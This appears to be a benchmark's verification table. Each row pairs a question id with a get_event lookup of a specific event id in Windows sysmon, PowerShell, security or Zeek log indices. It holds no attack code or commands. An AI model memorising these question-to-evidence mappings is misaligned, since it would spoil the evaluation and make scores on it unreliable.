| q-5b1be5bc3d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-6558da94d5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-9c61ce4f5a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoWbcdc"} | None |  |
| q-a02c21cf88 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoWbcdc"} | None |  |
| q-17978d878f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-39a48f4372 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-0ddfe84743 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqZ"} | None |  |
| q-48c7a92fb1 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-b93b75ed82 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwtwa"} | None |  |
| q-e6d0882d80 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuTlU_q"} | None |  |
| q-90896cabb3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuTlU_q"} | None |  |
| q-13099541a6 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0P"} | None |  |
| q-030bb44023 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdLx28"} | None |  |
| q-117b778a1d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuiuXgG"} | None |  |
| q-45994bd548 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuiuXgG"} | None |  |
| q-12dd6807d0 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-ef02bc9bfc | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-0a1f53bb7d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-cb6f25d1c9 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0i"} | None |  |
| q-277c855950 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1A"} | None |  |
| q-7073e98ab4 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdLx3n"} | None |  |
| q-31a8117dd1 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-dd6dcff461 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBudppFX"} | None |  |
| q-27928439bf | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBudppFY"} | None |  |
| q-8db1b3254d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnfdUsq"} | None |  |
| q-fe2388a3b5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnQM1oU"} | None |  |
| q-e47579041e | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1A"} | None |  |
| q-2b0f5f987c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-fe2eec15ad | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoXbqWA"} | None |  |
| q-8daac2dc5c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBow1KRR"} | None |  |
| q-72d194c3a9 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-b555364e41 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-d8ffd9449a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-af661cd5de | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-23d6f6f337 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-cc155f63bc | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-74fc3756d1 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaboE"} | None |  |
| q-93120147f0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBow1KRR"} | None |  |
| q-4e01504efe | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBov08Fg"} | None |  |
| q-3842dd0956 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR9H"} | None |  |
| q-193bc8e4ed | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR9H"} | None |  |
| q-a77dc36222 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8V"} | None |  |
| q-f358902d48 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8V"} | None |  |
| q-e2e2851670 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR85"} | None |  |
| q-82b684cb52 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR_2"} | None |  |
| q-8b01a161ca | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8KXgx"} | None |  |
| q-1f090c9a8a | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8KXgx"} | None |  |
| q-70002aa5cf | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fR"} | None |  |
| q-5ed00607c7 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBouzOll"} | None |  |
| q-f0902fdf9d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBouzOll"} | None |  |
| q-3c2ba85f8e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-78874884ee | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-6193210ddf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-9b9755f94c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-ea2b8199d2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-3a2453a474 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-3ea7b6ae00 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-3cd1dad5f4 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLr6"} | None |  |
| q-dbd4646da5 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLr9"} | None |  |
| q-4d37b7e05d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-eb34250116 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy1B5lB"} | None |  |
| q-ba48b4827f | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-e23d65378a | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-3b1455ade8 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-f6e1cc290a | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR8i"} | None |  |
| q-4d8b305ca9 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBur1GH0"} | None |  |
| q-ca7cc2cd3d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBur1GH0"} | None |  |
| q-de5a321178 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-10c15515fa | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-7b33ccf95d | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-f9b99505b4 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByXfnRy"} | None |  |
| q-542464e171 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHW"} | None |  |
| q-0d6b00dbf3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNRGHl"} | None |  |
| q-54be9e8525 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoSVqPo"} | None |  |
| q-770709bda3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoQTo3z"} | None |  |
| q-5fb50b4a19 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4z4i"} | None |  |
| q-b4e5c2c8cc | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-41e062e59b | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4j7h"} | None |  |
| q-554f78711d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBow1qSj"} | None |  |
| q-2a9d11ef28 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnts2nD"} | None |  |
| q-51ade9e588 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoKOGL_"} | None |  |
| q-69b9792237 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnfdUsq"} | None |  |
| q-adc087581c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi85CSh"} | None |  |
| q-960d486966 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRH"} | None |  |
| q-137f77ce6a | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoqv86o"} | None |  |
| q-19b4fe6bce | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4j7n"} | None |  |
| q-fa76fead66 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8M"} | None |  |
| q-56cca44fe7 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeByNiUGh"} | None |  |
| q-df95d7a47c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoTWpZy"} | None |  |
| q-00caa4597e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-b356f43599 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-d3dab7cfaf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-f3dec744c1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-6275ed66d3 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByCVtlI"} | None |  |
| q-3c5d84adfd | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy0A4uc"} | None |  |
| q-ba2af5db17 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy3EfF6"} | None |  |
| q-60489f0005 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-8afa189054 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-4904952c3a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByXfnRy"} | None |  |
| q-1d4cf611b8 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBudppHD"} | None |  |
| q-85de78b5c2 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuitni7"} | None |  |
| q-b285bccfa6 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1A"} | None |  |
| q-7573cde249 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-40e9476e07 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-3a739d31bf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-b3daf45700 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-41052e8ba2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-b78ee57ae9 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwtwa"} | None |  |
| q-ec296a3ca1 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWlPk"} | None |  |
| q-9a9031e05c | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWlPk"} | None |  |
| q-5723d973c8 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWUg0"} | None |  |
| q-1334cb4761 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBjA9g2o"} | None |  |
| q-b6e16f7ec4 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-b066394825 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-cfdada31a2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-f3a6b17fa3 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBo05D7L"} | None |  |
| q-4127087a49 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoty_Kk"} | None |  |
| q-96e4e9e769 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoOSnoR"} | None |  |
| q-93ea197a71 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWUg0"} | None |  |
| q-66366a964d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30BSA"} | None |  |
| q-71362cb498 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30BSA"} | None |  |
| q-9927a6a2d0 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoGKqgM"} | None |  |
| q-783c3e39b3 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWlPk"} | None |  |
| q-f58955d03e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBufr2mI"} | None |  |
| q-12b443f4d6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz3z5O"} | None |  |
| q-cb67853727 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh9E"} | None |  |
| q-419618d60c | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgh8L"} | None |  |
| q-e373571b7f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi63kXG"} | None |  |
| q-3d31095a58 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeBwkgR_H"} | None |  |
| q-d38ecaf071 | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeByOkBkA"} | None |  |
| q-0c323279df | verify | get_event | {"index": ".ds-logs-zeek-default-2026.10.22-000001", "id": "AaFiKZc9VXKkeByNiUGc"} | None |  |
| q-656172cb4f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi63kXo"} | None |  |
| q-df3a218b3e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnIEszs"} | None |  |
| q-bc0bf35539 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-d46416dd36 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-6315cdd01f | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-4ff3228020 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-61aa08da61 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-f6bd71d19c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoz4j7h"} | None |  |
| q-7311cac449 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBov08Fg"} | None |  |
| q-a94f8ae84d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-20f6348fea | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy4FbJD"} | None |  |
| q-632c569b35 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuw7KBe"} | None |  |
| q-52f41c78e3 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuw7KBe"} | None |  |
| q-4bc3c07fb2 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv697k"} | None |  |
| q-bc6fee51c9 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv697k"} | None |  |
| q-9e251878ef | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv697k"} | None |  |
| q-2b2ec02ca7 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-153938baf6 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-7d6ba02524 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-93fe882c0e | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBy8J3fS"} | None |  |
| q-a44d29361c | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-d727ff47b1 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0b"} | None |  |
| q-d7127c5f16 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-13e2d84531 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXF"} | None |  |
| q-cd73be6faf | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBorwtwa"} | None |  |
| q-c5f76052a7 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-ca6cb97603 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-134f3bf4d0 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-bb2dab93dc | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi-6ySm"} | None |  |
| q-6957c43e6f | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-bdef986ec5 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-e2a6cbd7b2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBo05T5k"} | None |  |
| q-7a57d7f9d1 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-82edb39f98 | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0b"} | None |  |
| q-2a7ed1868b | verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB0u"} | None |  |
| q-8479f75aac | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBunxq0T"} | None |  |
| q-1539cf970f | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuTlU_q"} | None |  |
| q-576df2662a | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByKWk9M"} | None |  |
| q-aebb729aea | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi30hQJ"} | None |  |
| q-bbb9ad1d5d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoOSXoo"} | None |  |
| q-bd25a709d9 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-6cf1beb2be | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-d1cd4a36b0 | verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-3f25aada0e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-e47ccdff9e | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXH"} | None |  |
| q-cc902108c2 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQkXN"} | None |  |
| q-1a4d978e14 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoNQ2BV"} | None |  |
| q-1cd90951ca | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu4mRU"} | None |  |
| q-26ac4a6019 | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu4mRU"} | None |  |
| q-5e70b16e7d | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBogld9W"} | None |  |
| q-cfd98eefd6 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBi74TK0"} | None |  |
| q-eb29382265 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnQMVqo"} | None |  |
| q-c1b67b612d | verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuy-fsg"} | None |  |
